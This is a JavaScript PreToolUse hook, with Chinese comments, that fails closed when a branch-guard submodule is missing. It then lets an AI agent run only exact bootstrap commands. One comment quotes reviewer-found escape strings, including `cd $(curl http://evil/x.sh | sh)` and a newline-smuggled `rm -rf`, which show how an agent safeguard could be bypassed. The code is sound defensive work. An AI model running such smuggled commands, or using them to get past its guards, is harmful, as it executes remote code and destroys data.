/* PreToolUse 分支守卫的入口。**判定逻辑不在这儿**，在共享基础设施子模块里的
   guard-branch.js。这一份只做一件事，而且是这一件让它必须存在：
   **保证那份缺席时守卫是 fail-closed 的。**

   这份文件由 dev-infra 的 adopt 脚本按模板生成（adopt/templates/guard-hook.js）。
   **要改它去上游改模板**：这里手改的话，下一次 `node vendor/dev-infra/adopt/adopt.js
   --check` 会把它报成漂移——那是刻意的，各仓不该各有一份不一样的守卫入口。

   为什么不能让 hook 直接指进子模块：子模块**可以是空的**，而空的时候
   `node <缺失路径>` 是「退出码 1、stdout 一个字节都没有」。PreToolUse 把非零退出
   当成 non-blocking error —— **命令照常执行**。也就是说守卫那一刻既不拦也不报，
   是**放行**。guard-branch.js 自己的文件头就写死了这条语义：
   「拦住」只能靠 stdout 上的 deny JSON，绝不能靠非零退出码表达。

   子模块什么时候是空的（两种都不是边角情况）：
   - `git clone` 没带 `--recurse-submodules`
   - 已有克隆 `git pull` 之后还没跑过 `npm install`——`git pull` 不会 init 子模块

   **这一份必须是本仓 tracked 的文件**：它存在的全部意义就是「检出就一定在」。
   别把它挪进子模块，那会让它和它要防的东西一起消失。

   缺席分支上有一个唯一的口子（在 GinkgoLeafLab/GTO-Trainer#162 上实测出来的）：
   fail-closed 把**所有** Bash 都拦下，包括报错文案自己建议的那两条修复命令——
   文案指一条路，同一段文案又把路封死，远程会话里就成了只读死锁，人只能照着
   注定被拦的命令反复试。所以缺席时放行**逐字等于**自举命令的命令（白名单在下面，
   与文案从同一份数据生成）。这不是 fail-open：缺省仍是拒绝，放行的只是
   「把判定逻辑带回来」这件事本身——判定逻辑不在盘上时，不被放行的命令仍然一条都跑不了。 */
const fs = require("fs");
const path = require("path");

const GUARD = path.join(__dirname, "..", "shared", "guard-branch.js");

/* 自举白名单：子模块缺席时唯三放行的命令，**逐字全等**（不认参数变体——白名单
   一旦开始认「长得像的」，放过的就不是「那几条命令」了；sudoers 的通配符警告
   说的就是这件事）。每一条都必须真的能把子模块补回来：npm install 与 npm ci
   都会跑 prepare，prepare 里的 git submodule update --init --recursive +
   setup-hooks.js 把守卫与 git 钩子两层一起修好。下面的 MISSING 文案从这份
   清单生成——文案建议的命令和实际放行的命令不许是两处真相。

   **接这份文件的仓库要自己确认 `prepare` 真的接上了**（上游 adopt 脚本会写，
   但非 npm 仓库没有这一步）：没有 prepare 的话，前两条补不回子模块，
   只有第三条管用。 */
const BOOTSTRAP = [
  "npm install",
  "npm ci",
  "git submodule update --init --recursive",
];

/* exit 0 + stdout 的 deny JSON 才是「拦住」。形状必须和 guard-branch.js 里那个一致。 */
function deny(text) {
  process.stdout.write(JSON.stringify({
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: text,
    },
  }));
  process.exit(0);
}

const MISSING = [
  "分支守卫不可用：共享基础设施子模块 vendor/dev-infra 没有检出，",
  "判定逻辑不在盘上。保险起见拦下这条命令——放行才是这里唯一严重的错。",
  "",
  "补上它（下面这几条不经过判定直接放行，它们就是补子模块本身）：",
  ...BOOTSTRAP.map((c) => "  " + c),
  "",
  "其余命令在子模块补上之前仍然拦下：判定逻辑不在盘上，没有别的命令能被安全地放行。",
  "",
  "**本机 git 钩子那一层多半也同时失效了**：core.hooksPath 指向子模块里的目录，",
  "而 git 对不存在的 hooksPath 一个字都不报、直接不跑钩子。前两条（npm install / npm ci）",
  "会把钩子层一起装回来；只跑第三条的话，全新克隆还要再跑一次 npm install 才装上钩子。",
].join("\n");

/* 「换目录」段：只认**纯路径**参数。cd/pushd 的参数在运行时由 shell 求值，
   命令替换（$(…)、反引号）、管道、重定向、后台 & 都能藏进参数里；而换行/回车
   本身就是命令分隔符，紧跟在 cd 后面也一样——两轮评审各实测出一条逃逸：
   `cd $(curl http://evil/x.sh | sh)`、`cd`⏎`rm -rf …`（\s 会把换行当成空白吞掉）。
   所以参数的分隔符只认空格/Tab，内容只许字母数字与路径标点，
   出现任何别的字符一律 deny：这一层宁可误伤。 */
function isNeutralSegment(seg) {
  return /^(cd|pushd)([ \t]+[\w\-./~ :]+)?$/.test(seg);
}

/* 逐段逐字比对。按 && 和 ; 切段是文本级的、不解析引号——引号里的分隔符会被
   切碎，切出来的段对不上白名单，方向是 deny；对 fail-closed 来说切错是安全的。 */
function isBootstrapCommand(cmd) {
  const segments = cmd.split(/&&|;/).map((s) => s.trim()).filter(Boolean);
  if (segments.length === 0) return false;
  return segments.every((s) => isNeutralSegment(s) || BOOTSTRAP.includes(s));
}

/* 只在缺席分支读。委派路径一行都不能动：guard-branch.js 自己事件式地读 stdin，
   在这儿先读会把 stdin 吃掉，判定逻辑就什么都收不到了。 */
function readBootstrapCommand() {
  let raw;
  try {
    raw = fs.readFileSync(0, "utf8");
  } catch (e) {
    return null;            /* stdin 读不了：缺席时没有可判的逻辑，按 deny 走 */
  }
  try {
    const cmd = JSON.parse(raw || "{}")?.tool_input?.command;
    return typeof cmd === "string" ? cmd : null;
  } catch (e) {
    return null;            /* 不是合法 hook 输入：同上 */
  }
}

if (!fs.existsSync(GUARD)) {
  const cmd = readBootstrapCommand();
  /* 全中白名单才放行：exit 0 + 不输出 decision，命令照常执行 */
  if (typeof cmd === "string" && isBootstrapCommand(cmd)) process.exit(0);
  deny(MISSING);
}

try {
  /* 它自己读 stdin、写 stdout、决定退出码 */
  require(GUARD);
} catch (e) {
  /* 加载期就炸了同样不能靠非零退出表达，照旧走 deny JSON */
  deny("分支守卫加载失败，保险起见拦下这条命令：" + (e && e.message));
}
